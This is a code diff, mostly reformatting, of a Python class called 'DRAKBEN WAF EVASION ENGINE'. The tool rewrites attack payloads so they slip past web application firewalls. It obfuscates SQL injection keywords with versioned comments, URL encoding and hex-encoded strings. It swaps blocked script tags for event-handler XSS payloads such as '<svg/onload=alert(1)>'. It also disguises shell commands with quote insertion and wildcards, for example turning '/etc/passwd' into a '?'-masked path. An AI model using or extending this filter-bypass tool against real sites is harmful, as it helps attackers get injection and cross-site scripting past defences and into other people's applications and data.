@@ -1,4 +1,3 @@
-
 """
 DRAKBEN WAF EVASION ENGINE
 Description: Advanced payload obfuscation and WAF bypass techniques.
@@ -10,9 +9,8 @@ Techniques:
 """
 
 import random
-import urllib.parse
 import binascii
-from typing import List, Optional
+
 
 class WAFEvasion:
     """
@@ -22,38 +20,53 @@ class WAFEvasion:
 
     def __init__(self):
         self.sql_keywords = {
-            "UNION": ["/*!UNION*/", "/*!50000UNION*/", "Uni/**/on", "%55nion", "UN%0aION"],
-            "SELECT": ["/*!SELECT*/", "/*!50000SELECT*/", "Se/**/lect", "%53elect", "SE%0aLECT"],
+            "UNION": [
+                "/*!UNION*/",
+                "/*!50000UNION*/",
+                "Uni/**/on",
+                "%55nion",
+                "UN%0aION",
+            ],
+            "SELECT": [
+                "/*!SELECT*/",
+                "/*!50000SELECT*/",
+                "Se/**/lect",
+                "%53elect",
+                "SE%0aLECT",
+            ],
             "FROM": ["/*!FROM*/", "/*!50000FROM*/", "Fr/**/om", "%46rom"],
             "WHERE": ["/*!WHERE*/", "Wh/**/ere"],
             "OR": ["||", "/*!OR*/", "/*!50000OR*/", "%26%26"],
             "AND": ["&&", "/*!AND*/", "/*!50000AND*/", "%26"],
-            " ": ["/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+"]
+            " ": ["/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+"],
         }
-        
+
     def obfuscate_sql(self, payload: str, aggressiveness: int = 2) -> str:
         """
         Obfuscate SQL Injection payload.
         Aggressiveness: 1 (Basic) -> 3 (Extreme/Experimental)
         """
         obfuscated = payload
-        
+
         # 1. Whitespace Evasion (Space -> Comment)
         if aggressiveness >= 1:
             method = random.choice(self.sql_keywords[" "])
             obfuscated = obfuscated.replace(" ", method)
-            
+
         # 2. Keyword Pollution
         if aggressiveness >= 2:
             for kw, variations in self.sql_keywords.items():
-                if kw == " ": continue
+                if kw == " ":
+                    continue
                 if kw in obfuscated.upper():
                     # Pick a variation that is NOT the keyword itself
                     replacement = random.choice(variations)
                     # Case-insensitive replace via regex logic simulation
                     idx = obfuscated.upper().find(kw)
                     while idx != -1:
-                        obfuscated = obfuscated[:idx] + replacement + obfuscated[idx+len(kw):]
+                        obfuscated = (
+                            obfuscated[:idx] + replacement + obfuscated[idx + len(kw) :]
+                        )
                         idx = obfuscated.upper().find(kw, idx + len(replacement))
 
         # 3. Hex Encoding (Standard WAF Bypass)
@@ -63,7 +76,7 @@ class WAFEvasion:
                 parts = obfuscated.split("'")
                 new_parts = []
                 for i, part in enumerate(parts):
-                    if i % 2 == 1: # Inside quotes
+                    if i % 2 == 1:  # Inside quotes
                         hex_val = "0x" + binascii.hexlify(part.encode()).decode()
                         new_parts.append(hex_val)
                     else:
@@ -82,24 +95,24 @@ class WAFEvasion:
         for i in range(len(chars)):
             if random.choice([True, False]):
                 chars[i] = chars[i].upper()
-        
+
         mutated = "".join(chars)
-        
+
         # 2. Protocol Wrappers: javascript: -> java	script: (Tab)
         if "javascript:" in mutated.lower():
             mutated = mutated.replace(":", "	:")
-            
+
         # 3. Double Check: SVG payload if script is blocked
         if "<script" in payload.lower():
             # Return a polymorphic variation
             variations = [
-                mutated, 
-                "<img src=x onerror=alert(1)>", 
-                "<svg/onload=alert(1)>", 
-                "<body/onload=alert(1)>"
+                mutated,
+                "<img src=x onerror=alert(1)>",
+                "<svg/onload=alert(1)>",
+                "<body/onload=alert(1)>",
             ]
             return random.choice(variations)
-            
+
         return mutated
 
     def obfuscate_shell(self, payload: str) -> str:
@@ -115,8 +128,8 @@ class WAFEvasion:
                     new_payload += f"'{char}'"
                 else:
                     new_payload += char
-            return new_payload.replace("''", "") # Cleanup
-            
+            return new_payload.replace("''", "")  # Cleanup
+
         # 2. Wildcard Injection: /etc/passwd -> /e??/p??swd
         if "/" in payload:
             parts = payload.split("/")
@@ -125,16 +138,17 @@ class WAFEvasion:
                 if len(part) > 2:
                     # Randomly replace chars with ?
                     chars = list(part)
-                    idx = random.randint(1, len(chars)-1)
+                    idx = random.randint(1, len(chars) - 1)
                     chars[idx] = "?"
                     new_parts.append("".join(chars))
                 else:
                     new_parts.append(part)
             return "/".join(new_parts)
-            
+
         return payload
+
 
 # Usage Example:
 # waf = WAFEvasion()
-# print(waf.obfuscate_sql("UNION SELECT 1,2")) 
+# print(waf.obfuscate_sql("UNION SELECT 1,2"))
 # -> /*!50000UNION*/ /**/ /*!50000SELECT*/ /**/ 1,2
